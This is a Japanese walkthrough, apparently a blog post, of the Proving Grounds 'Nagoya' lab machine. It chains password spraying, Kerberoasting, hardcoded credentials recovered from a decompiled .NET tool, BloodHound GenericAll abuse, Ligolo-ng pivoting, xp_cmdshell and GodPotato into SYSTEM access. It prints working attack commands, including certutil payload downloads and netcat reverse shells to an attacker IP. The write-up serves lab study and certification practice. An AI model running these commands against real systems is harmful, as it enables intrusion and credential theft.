+++
title = "Proving Grounds Practice - Nagoya Writeup"
date = "2026-11-23"
description = "Password Spraying、Kerberoasting、.NETアプリケーション解析、BloodHoundのGenericAll、Ligolo-ng、MSSQL、GodPotatoによる権限昇格"
tags = ["Proving Grounds Practice", "OSCP", "[Windows]", "[Active Directory]", "[MSSQL]", "[Ligolo-ng]", "[BloodHound]", "[GodPotato]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Nagoya |
| OS | Windows |
| Domain | nagoya-industries.com |
| IP Address | 192.168.160.21 |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- 192.168.160.21
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI
9389/tcp  open  mc-nmf
49666/tcp open  msrpc
49667/tcp open  msrpc
49676/tcp open  ncacn_http
49678/tcp open  msrpc
49681/tcp open  msrpc
49691/tcp open  msrpc
49698/tcp open  msrpc
49717/tcp open  msrpc
```

ドメインが `nagoya-industries.com`、ホスト名が `NAGOYA` であることを確認した。

### Web Enumeration

ブラウザで以下のURLにアクセスする。

```text
http://192.168.160.21/Team
```

Teamページからドメインユーザーの一覧を取得できる。

取得したユーザー名を `output.txt` に保存する。

### User List

```text
matthew.harrison
emma.miah
rebecca.bell
scott.gardner
terry.edwards
holly.matthews
anne.jenkins
brett.naylor
melissa.mitchell
craig.carr
fiona.clark
patrick.martin
kate.watson
kirsty.norris
andrea.hayes
abigail.hughes
melanie.watson
frances.ward
sylvia.king
wayne.hartley
iain.white
joanna.wood
bethan.webster
elaine.brady
christopher.lewis
megan.johnson
damien.chapman
joanne.lewis
```

---

## Initial Access

### Password Spraying

Webサイトが2023年に作成されていることから、季節名と2023を組み合わせたパスワードを試す。

```bash
nxc smb 192.168.160.21 -u output.txt -p 'Summer2023' --continue-on-success
```

認証に成功したユーザーが見つかった。

```text
SMB 192.168.160.21 445 NAGOYA [+] nagoya-industries.com\fiona.clark:Summer2023
```

### Kerberoasting

取得した `fiona.clark` の認証情報を利用してSPNを持つアカウントを調査する。

```bash
impacket-GetUserSPNs nagoya-industries.com/fiona.clark:Summer2023 -dc-ip 192.168.160.21 -debug -outputfile kerveroast.txt
```

取得したKerberos TGSハッシュをHashcatで解析する。

```bash
hashcat -m 13100 kerveroast.txt /usr/share/wordlists/rockyou.txt
```

解析結果からMSSQLサービスアカウントの認証情報を取得した。

```text
svc_mssql/Service1
```

---

## SMB Enumeration

取得した `fiona.clark` の認証情報でSMB共有を確認する。

```bash
smbclient -L //192.168.160.21 -U nagoya-industries.com/fiona.clark
```

以下の共有が確認できた。

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

SYSVOLとNETLOGONにアクセスする。

```bash
smbclient //192.168.160.21/SYSVOL -U nagoya-industries.com/fiona.clark
```

```bash
smbclient //192.168.160.21/NETLOGON -U nagoya-industries.com/fiona.clark
```

NETLOGON内に `ResetPassword` ディレクトリが存在することを確認した。

```text
ResetPassword
```

---

## Credential Discovery

### .NET Application Analysis

NETLOGON内の `ResetPassword` を解析する。

ILSpyをインストールする。

```bash
wget https://packages.microsoft.com/config/debian/13/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update
sudo apt install dotnet-sdk-10.0 -y
dotnet tool install --global ilspycmd
```

実行ファイルを逆コンパイルする。

```bash
ilspycmd -p -o ResetPassword_source ResetPassword.exe
```

生成されたソースコードを確認する。

```bash
cd ResetPassword_source/ResetPassword
```

```bash
ls
```

```text
Program.cs
```

```bash
cat Program.cs
```

ソースコード内にサービスアカウントの認証情報がハードコードされていた。

```csharp
private static string service_username = "svc_helpdesk";

private static string service_Password = "U299iYRmikYTHDbPbxPoYYfa2j4x4cdg";
```

取得した認証情報：

```text
Username: svc_helpdesk
Password: U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

また、プログラムの処理を確認すると、指定したドメインユーザーのパスワードを変更する機能が実装されていた。

```csharp
UserPrincipal userPrincipal = UserPrincipal.FindByIdentity(principalContext, 0, text);
userPrincipal.SetPassword(text2);
userPrincipal.Save();
```

---

## BloodHound Enumeration

### Authentication Check

取得した `svc_helpdesk` の認証情報を確認する。

```bash
nxc smb 192.168.160.21 -u svc_helpdesk -p 'U299iYRmikYTHDbPbxPoYYfa2j4x4cdg' -d nagoya-industries.com
```

認証に成功した。

### SMB Shares

```bash
smbclient -L //192.168.160.21 -U 'nagoya-industries.com/svc_helpdesk'
```

### BloodHound Data Collection

Neo4jとBloodHoundを起動する。

```bash
sudo neo4j start
```

```bash
bloodhound-start
```

BloodHound用のデータを収集する。

```bash
bloodhound-python -d nagoya-industries.com -u svc_helpdesk -p 'U299iYRmikYTHDbPbxPoYYfa2j4x4cdg' -ns 192.168.160.21 -dc nagoya-industries.com -c All
```

生成された各JSONファイルをBloodHoundにアップロードする。

### GenericAll

BloodHoundで `SVC_HELPDESK@NAGOYA-INDUSTRIES.COM` のOutbound Object Controlを確認する。

また、`CHRISTOPHER.LEWIS@NAGOYA-INDUSTRIES.COM` が `DEVELOPERS@NAGOYA-INDUSTRIES.COM` に所属しており、リモートアクセスできることを確認した。

Pathfindingを使用して以下の経路を調査する。

```text
SVC_HELPDESK
    |
    v
REMOTE MANAGEMENT USERS
```

調査の結果、`GenericAll` 権限を利用できることが分かった。

---

## Lateral Movement

### Password Reset

`svc_helpdesk` の権限を利用して `CHRISTOPHER.LEWIS` のパスワードを変更する。

```bash
net rpc password "CHRISTOPHER.LEWIS" "newP@ssword2022" -U "nagoya-industries.com/svc_helpdesk%U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S 192.168.160.21
```

### Evil-WinRM

変更したパスワードを利用してEvil-WinRMで接続する。

```bash
evil-winrm -i 192.168.160.21 -u 'CHRISTOPHER.LEWIS' -p 'newP@ssword2022'
```

接続後、ユーザーを確認する。

```powershell
whoami
```

```text
nagoya-ind\christopher.lewis
```

`local.txt` を取得する。

```powershell
type local.txt
```

---

## MSSQL Enumeration

### Ligolo-ng

Christopher.LewisのセッションからAgentを転送する。

```powershell
wget http://192.168.45.158/agent.exe -O agent.exe
```

Kali側でLigolo-ng Proxyを起動する。

```bash
sudo ./proxy -selfcert
```

Windows側でAgentを起動する。

```powershell
.\agent.exe -connect 192.168.45.158:11601 -ignore-cert
```

Kali側のLigolo-ngコンソールでセッションを選択する。

```text
session
1
start
```

内部ネットワークへのルートを追加する。

```bash
sudo ip route add 192.168.160.0/24 dev ligolo
```


### MSSQL Authentication

取得済みの `svc_mssql` アカウントを利用してMSSQLに接続する。

```bash
impacket-mssqlclient nagoya-industries.com/svc_mssql:service@127.0.0.1 -windows-auth
```

ログイン後、現在のユーザーを確認する。

```sql
select system_user;
```

---

## Privilege Escalation

### Enable xp_cmdshell

MSSQLからWindowsコマンドを実行するため、`xp_cmdshell` を有効化する。

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Reverse Shell

Kali側でNetcatを起動する。

```bash
nc -lvnp 445
```

MSSQLの `xp_cmdshell` からNetcatをダウンロードする。

元ログのコマンド：

```sql
xp_cmdshell "certutil -urlcache -split -f http://192.168.45.158:445/nc.exe
```

続いてNetcatを実行する。

元ログのコマンド：

```sql
xp_cmdshell "C:\users\public\nc.exe 192.168.45.158 -e cmd.exe"
```

### GodPotato

取得したシェル上でGodPotatoを実行する。

```cmd
GodPotato-NET4.exe -cmd "C:\users\public\nc.exe 192.168.45.158 139 -e cmd.exe"
```

Kali側で接続を待ち受ける。

```bash
nc -lvnp 139
```

### Proof

```cmd
type proof.txt
```

---

## Summary

```text
Nmap
  |
  v
Web Enumeration (/Team)
  |
  v
User Enumeration
  |
  v
Password Spraying
  |
  v
Fiona.Clark Credentials
  |
  v
Kerberoasting
  |
  v
svc_mssql Credentials
  |
  v
SMB Enumeration
  |
  v
.NET Application Analysis
  |
  v
svc_helpdesk Credentials
  |
  v
BloodHound
  |
  v
GenericAll
  |
  v
Christopher.Lewis Password Reset
  |
  v
Evil-WinRM
  |
  v
Ligolo-ng
  |
  v
MSSQL Port Forwarding
  |
  v
xp_cmdshell
  |
  v
Reverse Shell
  |
  v
GodPotato
  |
  v
SYSTEM
```

### Attack Path

1. Teamページからドメインユーザーを列挙。
2. Password Sprayingで `fiona.clark` の認証情報を取得。
3. KerberoastingでMSSQLサービスアカウントの認証情報を取得。
4. NETLOGONのResetPassword.exeを解析し、`svc_helpdesk` の認証情報を発見。
5. BloodHoundでGenericAll権限を特定。
6. Christopher.Lewisのパスワードを変更してEvil-WinRMで接続。
7. Ligolo-ngで内部MSSQLにポートフォワード。
8. xp_cmdshellでWindowsコマンドを実行。
9. GodPotatoを利用してSYSTEM権限を取得。
